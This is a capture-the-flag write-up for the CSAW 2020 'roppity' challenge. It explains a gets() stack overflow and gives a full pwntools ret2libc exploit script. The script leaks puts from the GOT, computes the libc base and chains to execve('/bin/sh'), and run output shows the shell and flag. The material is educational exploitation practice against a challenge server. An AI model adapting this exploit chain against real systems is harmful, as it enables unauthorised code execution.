# roppity (Pwn, 50 points)

> Welcome to pwn!
> nc pwn.chal.csaw.io 5016

This challenge provides you with the binary `rop` and `libc-2.27.so` that the
server is running. From the name and description, it's obviously
a Return-Oriented Programming (ROP) challenge. I'm still pretty new to these so
this was a really fun one for me as I learned some new things along the way.

First we check out the binary to see what we're working with:

```sh
$ file rop
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d177aa372f308c07c8daaddec53df7c5aafd630, not stripped
$ checksec --file=rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   65) Symbols       No    0               1               rop
$ checksec --file=libc-2.27.so
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    DSO             No RPATH   No RUNPATH   No Symbols        Yes   79              170             libc-2.27.so
```

So we're dealing with a 64-bit binary that which includes the symbols, but
doesn't have many protections on. Just NX (non-executable stack) so we won't be
able to inject shellcode and return to it, hence the need for ROP. Libc has
protections, but this is pretty standard and we'll see how to work around it.

Decompiling the binary in Ghidra we see that it's a super simply binary that
just prints hello, reads our input into a local 32-byte buffer and returns.
`gets` will read an arbitrary amount of bytes until a newline or EOF is seen, so
this is where our overflow happens.

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char local_28 [32];
  
  init(param_1);
  puts("Hello");
  gets(local_28);
  return 0;
}
```

Now we need to figure out how to use this overflow to get a shell, basically we
are going to want to ROP-to-libc and execute `execve("/bin/sh", 0, 0)`. Because
they provided the libc version we don't need to leak which version they are
using and can simply pull the offsets for the functions we want, but because of
ASLR we first need to find out where it is.

So for our exploit we'll need to do the following:
1. Leak libc's base address
2. Compute a ROP chain to `execve("/bin/sh", 0, 0)`
3. Submit the payload and get our shell

But the code only asks for input once, so how do we leak the address _and_ then
submit a payload? Well, we can print the address and then just call back into
main, which will ask for more input and allow us to ROP once more.

To leak the libc base address we need to leak a function within libc, and the
global offset table (GOT) is a great way to do that. Our initial ROP chain looks
like so. We use pwntools to create it since it can look up the gadgets and
symbols for us so we don't have to hard code them.

```python
e = ELF('./rop')
r = ROP(e)
r.raw(r.rdi)             # pop rdi; ret
r.raw(e.got['puts'])     # put the address of puts from libc into rdi, the argument for puts
r.raw(e.plt['puts'])     # call puts to print it
r.raw(e.symbols['main']) # return to main after puts
```

Once we have the address, we can easily compute libc base by subtracting from it
the offset from the base of libc.

```python
# NOTE: the libc variable is pwntools's ELF("libc.so") which allows us to easily
# find the runtime addresses once we set the base.
libc_base = puts_addr-libc.symbols['puts']
libc.address = libc_base
```

After this we are prompted for input again and we can submit the shell paylod.

```python
r = ROP(libc)
r.raw(r.rdi)                         # Load address of /bin/sh into first arg
r.raw(next(libc.search(b"/bin/sh")))
r.raw(r.rsi)                         # Zero out second arg
r.raw(0)
r.raw(r.rdx)                         # Zero out third arg
r.raw(0)
r.raw(libc.symbols['execve'])        # Return to execve("/bin/sh", 0, 0)
```

There's also a cool idea called "one-shot gadgets" which you can use to simplify
the exploit and simply return to an address instead of building up the full call
yourself. [one_gadget](https://github.com/david942j/one_gadget) is
a command-line tool you can install to search for these and try them out.  They
have some constraints so they won't always work, but you can just try them and
if they work, great! You're done. There was a valid one shot gadget for this too
at location `libc_base+0x4f365`. So the second payload is just `padding
+ pack(libc_base+0x4f365)`.

Either one works, though the former is a little more flexible since I can run it
locally for testing and on the remote server where the one shot gadget is
dependent on which libc version you have and mine is different.

Putting all this info together, we run our exploit to the following output:

```sh
$ python3 exploit.py
[*] '/home/kali/gh-ctf/csaw-quals-2020/roppity/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/kali/gh-ctf/csaw-quals-2020/roppity/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 5016: Done
[*] Loaded 14 cached gadgets for './rop'
[+] leaked puts: 0x7f773987ba30
[+] leaked libc base: 0x7f77397fb000
[*] Loading gadgets for '/home/kali/gh-ctf/csaw-quals-2020/roppity/libc-2.27.so'
[*] sending shell payload
[*] Switching to interactive mode
$ id
uid=1000(rop) gid=1000(rop) groups=1000(rop)
$ cat flag.txt
flag{r0p_4ft3r_r0p_4ft3R_r0p}
```

## Exploit Script

```python
from pwn import *
import sys

BINARY = './rop'
context.binary = BINARY
GDB = False
REMOTE = True
e = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    REMOTE = True

if REMOTE:
    libc = ELF("./libc-2.27.so")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start():
    if REMOTE:
        return remote("pwn.chal.csaw.io", 5016)
    else:
        if GDB:
            return gdb.debug(BINARY, '''
                break main
                continue
            ''')
        else:
            return process(BINARY)

RET_OFFSET = cyclic_find(0x6161616b)

def leak_and_set_libc_base(io):
    r = ROP(e)
    r.raw(r.rdi) # pop rdi; ret
    r.raw(e.got['puts']) # to rdi (1st arg)
    r.raw(e.plt['puts'])
    r.raw(e.symbols['main'])
    p = b'A'*RET_OFFSET + r.chain()

    io.readline() # Hello
    io.sendline(p)
    puts_addr = unpack(io.readline()[:-1].ljust(8, b'\x00'))
    log.success("leaked puts: " + hex(puts_addr))

    libc_base = puts_addr-libc.symbols['puts']
    log.success("leaked libc base: " + hex(libc_base))
    libc.address = libc_base # update libc base so we can calc ROP chain
    return libc_base

def libc_rop_to_interactive_sh(io):
    r = ROP(libc)
    r.raw(r.rdi)
    r.raw(next(libc.search(b"/bin/sh")))
    r.raw(r.rsi)
    r.raw(0)
    r.raw(r.rdx)
    r.raw(0)
    r.raw(libc.symbols['execve'])
    p = b'A'*RET_OFFSET + r.chain()

    # This one gadget also works remotely if we want to use that instead
    # one_gadget_offset = 0x4f365
    # p = b'A'*RET_OFFSET + pack(libc.address + one_gadget_offset)

    io.readline() # Hello
    log.info("sending shell payload")
    io.sendline(p)
    io.interactive()

def exploit():
    try:
        io = start()
        leak_and_set_libc_base(io)
        libc_rop_to_interactive_sh(io)
    finally:
        io.close()

exploit()
```

